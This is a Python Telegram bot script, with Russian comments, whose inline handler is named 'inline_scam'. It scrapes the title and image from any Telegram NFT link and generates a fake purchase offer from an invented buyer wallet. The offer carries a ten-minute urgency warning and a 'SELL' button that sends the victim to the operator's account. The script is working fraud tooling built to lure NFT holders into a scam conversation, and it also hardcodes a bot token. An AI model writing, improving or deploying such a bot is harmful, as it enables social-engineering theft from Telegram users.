import logging
import re
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.types import (
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.utils import executor

BOT_TOKEN = "9265955382:AAHCc8g_U3l9MeKJDqOdwbL7xTf9kdt9YmU"
YOUR_ACCOUNT = "Fodug"
DEFAULT_IMAGE = "https://i.ibb.co/6P0Z8sV/nft.jpg"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)


# ============================================================
# ПАРСИНГ ЛЮБОЙ ССЫЛКИ TELEGRAM NFT
# ============================================================
async def get_nft_data(url):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    html = await resp.text()
                    
                    # Ищем картинку
                    image_match = re.search(r'<meta property="og:image" content="([^"]+)"', html)
                    image_url = image_match.group(1) if image_match else DEFAULT_IMAGE
                    
                    # Ищем название (Title)
                    title_match = re.search(r'<meta property="og:title" content="([^"]+)"', html)
                    title = title_match.group(1) if title_match else "NFT Collectible"
                    
                    return image_url, title
    except Exception as e:
        print(f"Ошибка парсинга: {e}")
    
    return DEFAULT_IMAGE, "NFT Collectible"


# ============================================================
# INLINE-РЕЖИМ
# ============================================================
@dp.inline_handler()
async def inline_scam(inline_query: types.InlineQuery):
    query_text = inline_query.query.strip()
    
    if not query_text:
        await bot.answer_inline_query(inline_query.id, [], cache_time=1)
        return

    # Разделяем на цену и ссылку
    parts = query_text.split(" ", 1)
    price = parts[0].upper()
    nft_url = parts[1] if len(parts) > 1 else ""

    # Получаем картинку и название
    image_url = DEFAULT_IMAGE
    nft_title = "NFT Collectible"
    
    if nft_url.startswith("http"):
        image_url, nft_title = await get_nft_data(nft_url)

    # Формируем текст оффера
    text = (
        "🎨 **Вам поступило предложение!**\n\n"
        f"Коллекция: **{nft_title}**\n"
        f"Цена: **{price}**\n"
        "Покупатель: 0x71C...4A2\n\n"
        "⚠️ Предложение действует 10 минут.\n"
        "Нажмите «ПРОДАТЬ», чтобы подтвердить сделку."
    )

    # Кнопка перевода на твой аккаунт
    keyboard = InlineKeyboardMarkup()
    btn_sell = InlineKeyboardButton(
        text=f"💰 ПРОДАТЬ ЗА {price}",
        url="https://t.me/" + YOUR_ACCOUNT
    )
    keyboard.add(btn_sell)

    # Результат
    result = InlineQueryResultArticle(
        id="1",
        title=f"NFT Offer — {price}",
        description=f"Оффер для {nft_title}",
        thumb_url=image_url,
        input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode="Markdown"
        ),
        reply_markup=keyboard
    )

    await bot.answer_inline_query(inline_query.id, [result], cache_time=1)


if __name__ == "__main__":
    print("[+] Бот запущен")
    executor.start_polling(dp, skip_updates=True)
